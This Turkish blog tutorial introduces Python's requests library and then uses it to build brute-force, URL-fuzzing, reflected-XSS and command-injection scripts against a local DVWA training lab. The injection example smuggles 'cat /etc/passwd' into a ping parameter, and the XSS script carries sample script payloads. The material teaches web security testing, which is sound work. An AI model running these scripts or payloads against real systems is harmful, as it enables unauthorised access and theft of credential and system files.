---
title: "Hakerlar için Python: requests"
date: 2022-08-26
draft: false
---

---

### Hakerlar için Python: requests

![](https://cdn-images-1.medium.com/max/800/1*a87phGSd-sbfiJLWPfGMxA.png)

### Giriş

Merhaba, bu yazımızda web uygulama güvenliği alanında araçlar yazabileceğimiz python’un *requests* modülünü tanıyacağız.

### requests nedir?

[requests](https://requests.readthedocs.io/) python’un basit ama zarif bir HTTP modulüdür. HTTP isteklerini son derece kolay bir şekilde göndermenizi sağlar. GET metodu ile yapılan isteklerde URL’lerinize manuel olarak sorgu dizeleri eklemenize veya POST verilerinizi biçimsel olarak kodlamanıza gerek yoktur, requests modülü bu işleri sizin için halleder. Bu yazımızda *requests* ile çeşitli web toolları yazacağız ama önce kuruluma bir göz atalım. Python dilini temel olarak bildiğinizi varsayıp devam ediyoruz. Eğer isterseniz sitemizdeki python ile ilgili [yazılara](https://pwnlab.me/intermediate-python-articles/) da bakabilirsiniz.

### Kurulum

request modülünü kurmak için terminal ekranınıza aşağıdaki komutu yazabilirsiniz.

```
python -m pip install requests
```

kurulum tamamlandıktan sonra bir python dosyası oluşturup aşağıdaki kodu yazıp çalıştırdığınızda bir hata almıyorsanız, kurulumunuz başarılı demektir.

```
import requests
```

şimdi bu modülün yapısını biraz irdeleyelim.

#### Metotlar

request modülünün birçok metodu olsa da bizim için önemli olan GET ve POST isteklerini yaptığımız metotlardır. Bunların ne olduğunu bilmiyorsanız [HTTP request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) metotlarını araştırabilirsiniz.

**get()**En çok kullandığımız istek türü GET isteğidir. Tarayıcımızda herhangi bir web sayfasına girdiğimizde aslında GET isteği atmış oluruz. Bir URL adresine GET isteği attığımzda bize sayfanın HTML dökümünü(sayfa kaynağını) döndürür, tarayıcımız bu HTML’i yorumlayarak bize sayfayı gösterir. (sadece HTML değil beraberinde CSS ve Javascript kodları da geliyor ama onlarla işimiz yok) *requests.get()* metodu ile GET istekleri yapabiliriz. Kullanımı temel olarak aşağıdaki gibidir: *get(url, params, args)*

**post()**POST metodu genellikle [HTML formlarını](https://www.w3schools.com/html/html_forms.asp) gönderirken(submit) kullanılan metottur. Giriş ve kayıt sayfalarında bu metot kullanılır. Yani bir giriş sayfasına kaba kuvvet saldırısı yapmak için bu metodu kullanacağız. GET metodundan farklı olarak bu metodla gönderdiğimiz parametreler/veri URL’e eklenmez. POST istekleri göndermek için *requests.post()* metodu kullanılır. Kullanımı temel olarak aşağıdaki gibidir. *post(url, data, json, args)*

#### Parametreler

**url**GET veya POST isteğini göndereceğimiz web sayfasının adresidir.

**params, data, json, files**Bu parametreler GET veya POST isteğiyle göndereceğimiz parametreler/veridir. *params* get() metodunda diğerleri ise post() metodunda kullanılır. Bu metodların kullanımı hedef siteye bağlıdır eğer hedef site bir parametre değeri almıyorsa kullanımına gerek yoktur. Eğer parametre alıyorsa, yani bir HTML formu varsa, *name* etiket değerlerine istenilen verileri göndermemiz gerekir.

***params****:* get() metodunda *tuple* yapısında parametre/veri alır.   
**data:** post() metodunda *tuple* yapısında parametre/veri alır.   
***json****:* post() metodunda *json* yapısında parametre/veri alır.   
***files****:* post() metodunda XML veya farklı dosya türlerinde parametre/veri alır. GET isteğinde parametreler yani veri URL’in devamına eklenir. Bu yüzden direk URL’i düzenleyerek parametreleri ekleyebiliriz ya da get() metodunun *params* parametresine *dictionary* yapısında verileri verebiliriz. Bunun için:

```
params = {'key1': 'value1', 'key2': 'value2'}
```

şeklinde sözlük(dictionary) yapısında parametreleri tanımlarız. Bu parametreler ile bir istek yaptığımızda parametrelerin aşağıdaki şekilde URL’in sonuna eklenir.

```
https://httpbin.org/get?key2=value2&key1=value1
```

şimdi küçük bir python kodu yazarak GET isteği gönderelim.

```
import requests  
params = {'key1': 'value1', 'key2': 'value2'}  
response = requests.get('https://httpbin.org/get', params=params)
```

POST isteğiyle veri göndermenin farklı yolları vardır. GET isteğinde olduğu gibi sözlük yapısında veya json yapısında veri gönderilebilir: sözlük yapısında veri göndermek için:

```
data = {'key1': 'value1', 'key2': 'value2'}
```

json yapısında veri göndermek için [json](https://docs.python.org/3/library/json.html) modülünü kullanabilirsiniz.

#### **args**

argümanlar get() ve post() metotları için aynıdır ve kullanımları isteğe bağlıdır, kullanılmadığı taktirde varsayılan değerleri ile yürütülür.

***allow\_redirects(bool)***   
Yeniden yönlendirmeyi etkinleştirmek/devre dışı bırakmak için TRUE/FALSE değeri alır. Varsayılan olarak TRUE’dur. Yani yönlendirmelere izin verir.  
***auth(tuple)***   
Belirli bir HTTP kimlik doğrulamasını etkinleştirmek için kullanılır. Varsayılan olarak NULL değeri alır, kimlik doğrulaması yapmaz   
***cert(tuple)***   
Bir sertifika dosyasıni *tuple* yapısında alır. Varsayılan olarak NULL değeri alır.  
 ***cookies(dict)***   
Belirtilen url’ye gönderilecek çerez sözlüğünü alır. Varsayılan olarak çerez göndermez.   
***headers(dict)***   
Belirtilen url’ye gönderilecek HTTP headerını alır. Varsayılan olarak header göndermez.   
***proxies(dict)***   
Proxy URL’sine gönderilecek protokol’ü alır. Varsayılan olarak NULL değeri alır.   
***stream(bool)*** Yanıtın hemen indirilmesi (FALSE) veya akışa alınması (TRUE) ‘değeri ile belirlenir. Varsayılan olarak FALSE değerini alır yani yanıt hemen indirilir.   
***timeout(int)*** İstemcinin bağlantı kurması ve/veya yanıt göndermesi için kaç saniye bekleneceğini gösteren timeout süresini alır. Varsayılan olarak NULL değer alır, bu, isteğin bağlantı kapatılana kadar devam edeceği anlamına gelir   
***verify(bool)***   
Sunucuların TLS sertifikasını doğrulamak için TRUE doğrulamayı kapatmak için FALSE değer alır. Varsayılan olarak TRUE değerdedir.

#### response

Sunucunun gönderdiğimiz isteğe döndüğü yanıttır. Yazdığımız python kodlarında *get()* metodu ile aldığımız cevabı *response* isimli bir değişkende tutmuştuk. Şimdi bu cevabın içeriğini irdeleyelim.

```
print(response.text)
```

ile response’in içeriğini text olarak yadırabiliriz. Karşımıza aşağıdaki gibi bir metin çıkacaktır.

```
{  
"args": {  
"key1": "value1",   
"key2": "value2"  
},   
"headers": {  
"Accept": "*/*",   
"Accept-Encoding": "gzip, deflate",   
"Host": "httpbin.org",   
"User-Agent": "python-requests/2.28.1",   
"X-Amzn-Trace-Id": "Root=1-62e23811-6a7c14dc2c3bc62026eebb0c"  
},   
"origin": "185.51.36.100",   
"url": "https://httpbin.org/get?key1=value1&key2=value2"  
}
```

Burada aldığımız cevap ile ilgili bilgiler görüyoruz. Ayrıca aldığımız response’un tipine bakalım.

```
>>print(type(response))
```

```
<class 'requests.models.Response'>
```

requests.models.Response türünde bir nesne olduğunu anlıyoruz. [Kaynak koduna](https://requests.readthedocs.io/en/latest/_modules/requests/models/) baktığımzda:

![](https://cdn-images-1.medium.com/max/800/0*L_iXdDv3gSm2uu6j.png)

uzunca bir kod görüyoruz. Kendi dökümantasyonuna da [buradan](https://requests.readthedocs.io/en/latest/api/#requests.Response) ulaşabilirsiniz. Bizim için burada önemli olan \_\_attrs\_\_ kısmında yazan attiributeleridir.

```
print(response.__attrs__)
```

```
['_content', 'status_code', 'headers', 'url', 'history', 'encoding', 'reason', 'cookies', 'elapsed', 'request']
```

Ayrıca yukarıdaki kod ile de bu attiributeleri görebiliriz. Bu attiributeler ile *response.text* aldığımız metinde yazan değerlere ulaşabiliriz ama burda bizim için önemli olan *content* ‘tir.

```
print(response.content)
```

bize sayfa kaynağını döndürecektir. Şimdi verilen websitesinin adresini alan ve kaynağını bir html dosyasına kaydeden bir uygulama yapalım.

```
import requests
```

```
response = requests.get('https://www.google.com.tr')  
f = open("source.html","w")  
f.write(str(response.content))  
f.close()
```

sayfa kaynağının aşağıdaki gibi çekildiğini görebilirsiniz. (CSS ve Javascript kodlarıyla birlikte)

![](https://cdn-images-1.medium.com/max/800/0*W3QQk0ZEoY20GPcY.png)

Sayfa kaynağını [BeautifulSoup](https://pypi.org/project/beautifulsoup4/) modülü ile ayrıştırabilir içinden istedğiniz bilgileri alabilirsiniz. Ama bu yazımızda daha farklı şeyler yapacağız.

### Usomdan zararlı web sitelerini çekme

[USOM](https://www.usom.gov.tr/)(Ulusal Sİber Olaylara Müdahale Merkezi) ülkemizde ki siber olaylara karşı 7/24 çalışma esasında göre faaliyet gösteren bir oluşumdur. İnternetteki zararllı siteleri indekslediği bir listesi bulunmaktadır. Bu listeye [buradan](http://www.usom.gov.tr/url-list.txt) ulaşabilirsiniz. Şimdi python ile bu listeyi çekmeye çalışalım.

```
import requests  
response = requests.get("http://www.usom.gov.tr/url-list.txt", verify=False)  
with open("usom.txt", "wb") as binary_file:  
  binary_file.write(response.content)
```

Basit bir GET isteği ile bu listeyi çekebildik. Şimdi elimizde olan bir URL’in bu listede yer alıp almadığını kontrol eden bir fonksiyon yazalım.

```
def check(url):  
  f = open("usom.txt")  
  lines = f.read()  
  lines =lines.split('\n')  
  for line in lines:  
    if line == url:  
    text = url+" zararlıdır"  
    return text
```

```
  text = url+" zararlı değildir."  
  return text
```

Fonksiyona verdiğimiz URL’i aldığımız metin dosyasında arayarak bulduğu takride bize zararlı olduğunu bulamadığı taktirde zararsız olduğunu döndüren bir uygulama yapmış olduk.

### Kaba Kuvvet Saldırısı

Kaba Kuvvet Saldırısı, doğrusunu bulma umuduyla deneme yanılma yönetimi kullanarak bir web sayfasına giriş yapmak için kullanabileceğimiz basit ancak hala etkili bir saldırı türüdür. Bunu python uygulamamızla nasıl yapabileceğimize bir bakalım. Bunun için DVWA uygulamasını kullanacağım.

![](https://cdn-images-1.medium.com/max/800/0*D7cpaI2bY2tgv3Ig.png)

Burada giriş sayfamı [burp suite](https://portswigger.net/burp) aracıyla dinledim. username ve password alanlarına ‘aa’ değerini girerek login butonuna bastım. Yapılan GET isteği burp aracım üzerinde HTTP History bölümünde yakalanmış oldu. Tabi bunun için faklı araçlar da kullanabilirsiniz. Biz buradaki bazı bilgileri kullanacağız. Öncellikle DVWA sayfasına oturum açarak eriştiğimiz için python uygulamamızında bir şekilde oturuma erişmesi gerekiyor. Peki oturum nedir? kısaca bahsedecek olursak, bir giriş sayfasından kullanıcı adı/şifre bilgilerimizle giriş yaptığımızda aslında bir oturum başlatmış oluruz. İşimiz bitip tarayıcımızı kapattığımızda veya üzerinden belli bir süre geçtiğinde oturum sonlandırılır. Web uygulamaları oturum oluştururken çerelerden(cookie) yararlanır, bir çerez istemci bilgisayarında bir çerez sunucuda olmak üzere iki çerez oluşturulur. Bu iki çerez de kaybolmadığı sürece oturum devam eder. Biz burada DVWA sayfasına giriş yaparak aldığımız oturum çerezini python uygulamamıza vererek bizim otururumuz ile web sayfasına erişmesini sağlayacağız. Burp aracında işaretli alan ‘PHPSESID’ bizim oturum çerezimizdir. Yalnız acele etsek iyi olur, oturumun süresi bitiyor…

```
import requests
```

```
header = {"Cookie": "security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91"} #oturum çerezini header'a veriyoruz.
```

```
usernames = ["admin", "root", "user", "aa"]       #denemelerde kullanacağımız kullanıcı adı listesi  
passwords = ["resu", "password", "toor", "1234"]  #denemelerde kullanacağımız şifre listesi
```

```
for i in usernames:  
  for j in passwords:  
    url = f"http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&password={j}&Login=Login"  
    #Uygulamımız GET isteğiyle çalıştığı için username ve password bilgilerini URL'e ekleyerek deneyebiliriz.  
    result = requests.get(url=url, headers=header)  
    if not "Username and/or password incorrect" in str(result.content):  
      print("Username: ", i)  
      print("password: ", j)  
      print("Status code: ",result.status_code)  
      print("Length: ", len(result.content))  
      print("Username and Password is found")
```

![](https://cdn-images-1.medium.com/max/800/0*WFaG5gXYv4_u5frj.png)

Kodu python dosyasına yazıp çalıştırdığımızda canlıdaki DVWA sunucusuna GET istekleri göndererek denemeler yapacaktır.

Ve evet saldırımız başarılı kullanıcı adı ve şifre bilgisini bulduk. Bu web sayfasında GET metodu kullanıldığı için saldırıyı URL üzerinde düzenleme yaparak kolayca gerçekleştirebildik. Eğer POST metodu kullanılmış olsaydı HTML formundaki *name* niteliklerinin isimlerine göre bir tuple oluşturup post() metodunun *data* parametresine verip saldırımızı gerçekleştirebilirdik. Bu kadar ipucu yeter, gerisi sizde…

### URL Fuzzing

URL Fuzzing işleminde olası dosya/dizin isimlerinin yer aldığı bir liste oluşturulur ve bununla sisteme http isteği attırılır. Bu sayede sunucu üzerindeki dizinler ve dosyalar bulunmaya çalışılır. Tabi bu işlemi manuel olarak tek tek deneyerek yapmak yorucudur. Bunun için küçük bir python kodu yazmaya ne dersiniz?

```
import requests
```

```
fuzzing_list = ['/robots.txt','/etc/','/dvwa/','/passwd','/usr/','/index.php'] #arama yapacağımız liste  
header = {"Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"} #dvwa üzerindeki oturum çerezimiz
```

```
for i in fuzzing_list:  
  url = "http://10.0.2.4"+str(i) #dvwa sunucusunun ip adresi devamına fuzzing denemeleri yapıyoruz  
  result = requests.get(url = url, headers = header)  
  if "200" in str(result.status_code):  
    print("file or directory is found: ",i)  
  else:  
    print("file or directory isn't found: ",i)
```

python kodunu çalıştırdığımızda listedeki dizin ve dosya adlarını deneyerek bize aşağıdaki sonucu verecektir.

![](https://cdn-images-1.medium.com/max/800/0*P0_DM5nuoLcNWX16.png)

### XSS Saldırısı

XSS**,** temelinde web sayfası girdilerinden alınan değerlerin filtrelenmeden sayfa kaynağına dahil edilmesi sonucu ortaya çıkan bir güvenlik zafiyetidir. Bunun nedeni filtrelenmeyen girdilerden sayfaya zararlı javascript kodlarının dahil edilebilecek olmasıdır. Bu zafiyeti açığa çıkarabilecek birçok XSS scripti bulunmaktadır. Github üzerinde bulduğum bir listeye [buradan](https://github.com/payloadbox/xss-payload-list) ulaşabilirsiniz. Bu uygulamamızda, XSS scriptlerini içeren bir listedeki değerleri sayfaya göndererek sayfa kaynağına eklenip eklenmediğini kontrol eden bir uygulama yapacağız. Bunun için bir önceki uygulamada yaptığımız oturum çerezini yine header değişkenine verdim, bu kısmı bir daha anlatmıyorum.

DVWA sayfamız yine GET isteğiyle çalışıyor, bu yüzden *requests.get()* fonksiyonunu kullanacağız. Girdi bölümüne yazdıklarımız URL’de *name* bölümüne yazılıyor. Buradan hareketle biz de XSS scriptlerimizi *name* parametresine vereceğiz.

```
import requests
```

```
header = {"Cookie": "security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91"}  
xss_list = ["<h1>xss</h1>","<script>alert('xss')</script>","<script>prompt('xss')</script>","XSS","alert('xss')"]
```

```
for payload in xss_list:  
  url="http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name="+payload #name parametresine scriptlerin verilmesi  
  result = requests.get(url=url, headers=header) # GET isteğinin yapılması  
  if str(payload) in str(result.content):  
    print("Muhtemel XSS bulundu: "+str(payload))
```

Kodu python dosyasına yazıp çalıştırdığımızda canlıdaki DVWA sunucusuna GET istekleri göndererek denemeler yapacaktır.

![](https://cdn-images-1.medium.com/max/800/0*5GN1pw6l0XKQVsRQ.png)

Aldığımız sonuca bakarsak, web sayfası filtreleme yaptığı için XSS scriptlerimiz çalışmadı. <h1>xss</h1> HTML injection scriptiydi, XSS ise düz bir stringden ibaret. Siz daha farklı XSS scriptleri deneyebilirsiniz.

### Command Injection Saldırısı

Command injection,kod çalıştırma açıklığı olarak da bilinen bir zafiyet çeşididir. Girdiler filtrelenmeden sunucu shellinde çalıştırılması bu zafiyeti doğuruur. Saldırgan bu sayede istediği zararlı kodları sunucu shellinde çalıştırabilir. Uygulamamızda DVWA’nın command injection web sayfasını kullanacağız.

![](https://cdn-images-1.medium.com/max/800/0*Ik2wa2BdVo1Kxt3p.png)

Burada verilen ip adresine ping atan bir girdi bulunuyor. ip’nin devamına noktalı virgül atıp ls komutunu çalıştırmayı denediğimizde, çalıştıığını ve sunucu dizinini bize listelediğini görürürüz. Buradan hareketle bu sayfada comman injection zaafiyeti olduğunu belirleyebiliriz. Şimdi python ile nu zafiyeti nasıl tesğit edebileceğimize bakalım.

![](https://cdn-images-1.medium.com/max/800/0*64jFt9fe7MaTcEu7.png)

Sayfaya gönderdiğimiz isteği burp ile dinlediğimizde bu isteğin bir POST metodu ile yapıldığını ve gönderilen parametreleri görebiliyoruz. Önceki uygulamalarda yaptığımız gibi yine oturum çerezimizi(‘PHPSESSID) header parametremize vereceğiz. Devamında POST isteği olduğu için bir data tuple yapısı oluşturacağız ve bunu post() metodumuza vereceğiz.

```
import requests
```

```
command = "cat /etc/passwd"  #çalıştırmak istediğimizz komut  
header = {"Cookie": "security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6"} #oturum çerezi  
url = "http://10.0.2.4/dvwa/vulnerabilities/exec/" #saldırı yapacağımız web adresi  
data = {"ip":"127.0.0.1;"+command,"Submit":"Submit"} #POST metoduyla göndereceğimiz paramaetreler  
response = requests.post(url=url, data=data, headers=header) #isteğin gönderilmesi
```

```
if "www-data" in str(response.content):  
  print("command injection zafiyeti bulundu!")
```

‘www-data’ gelen cevapta bulunduğunda komutun çalıştığını anlayabileceğimiz bir stringden ibaret, passwd dosyası içinde bulunuyor. Bu yöntemi kullanarak daha uzun komutları sırayla python ile çalıştırabilirsiniz.

![](https://cdn-images-1.medium.com/max/800/0*HJlxB5W113qQFTkD.png)

Sonuç olarak, python kodunu çalıştırarak zafiyeti bulmuş olduk.

### Son

python ile web güvenliği alanında yapabileceğimiz başka ne tür işlemler olabilir yorumlara beklerim…